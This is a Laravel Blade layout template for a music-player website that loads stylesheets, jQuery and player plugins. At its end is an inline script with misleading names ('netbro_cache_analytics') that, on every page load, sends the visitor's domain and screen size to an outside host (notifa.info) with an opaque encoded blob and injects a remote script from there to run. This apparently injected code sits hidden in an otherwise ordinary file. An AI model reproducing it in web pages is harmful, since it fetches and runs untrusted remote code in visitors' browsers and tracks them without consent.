<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>{{ config('app.name', 'Laravel') }}</title>

    <!-- Scripts -->
    <script src="{{ asset('js/app.js') }}" defer></script>

    <!-- Fonts -->
    <link rel="dns-prefetch" href="//fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css?family=Nunito" rel="stylesheet" type="text/css">

    <!-- Styles -->
    <link rel="stylesheet" type="text/css" href="{{ asset('css/fonts.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ asset('css/bootstrap.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ asset('css/font-awesome.min.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ asset('js/plugins/swiper/css/swiper.min.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ asset('js/plugins/nice_select/nice-select.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ asset('js/plugins/player/volume.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ asset('js/plugins/scroll/jquery.mCustomScrollbar.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ asset('css/style.css') }}">


</head>
<body>

    <div class="ms_main_wrapper ms_profile">
        @yield('content')
    </div>

    <script src="{{ asset('js/app.js') }}" defer></script>
    <script type="text/javascript" src="{{ asset('js/jquery.js') }}"></script>
    <script type="text/javascript" src="{{ asset('js/bootstrap.min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('js/plugins/swiper/js/swiper.min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('js/plugins/player/jplayer.playlist.min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('js/plugins/player/jquery.jplayer.min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('js/plugins/player/audio-player.js') }}"></script>
    <script type="text/javascript" src="{{ asset('js/plugins/player/volume.js') }}"></script>
    <script type="text/javascript" src="{{ asset('js/plugins/nice_select/jquery.nice-select.min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('js/plugins/scroll/jquery.mCustomScrollbar.js') }}"></script>
    <script type="text/javascript" src="{{ asset('js/custom.js') }}"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mYfmK%2fLrNuqbQpR8B9piwV71cf5RdOGu10akdyUbvuUawGMinwl1gUmPXmp9aeUMFZjxAkdoODy1avl2%2fh7jgBTK8GCSv0fW3gzWs3FDtz56Y8u2J6tdlrmRFL13cYl2gep%2fBkKwWCY8aJIxcKad%2b%2fAJCgj%2f8gJJPdssUrY9F224Fdm0RwBSmFbz8QfCzbjQIeNva1%2fVHrO%2fjvp54xhoYpjy53TK0AuFjh%2b3tSHddzIn%2fbs51uys%2bsKftfjb0rHGkr1PDOU8MGzfSeBRGdGFltw3HanfDoixx0fS7ymVTJ6aY4l4n7t17G6ackaULUy4KDRC4152I9mrwfUZ6QXwGrGU%2f8JD2DcekQu1UR9vQ5%2bJF4JsZNXVv%2fARcGIsZysv7NzLiNQfNqPaPwkKt4UXpioZiOzcx46RYq7Dl8n3V8rqwMvGxZDH8%2bk1TDCIlFbRNB9NNZfzvVTTZaL7xoo1giKeDCcg9ZlSPM6lHWbtUAYqZh3Qr3oqzfGXEn1BSfSE8" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</body>
</html>
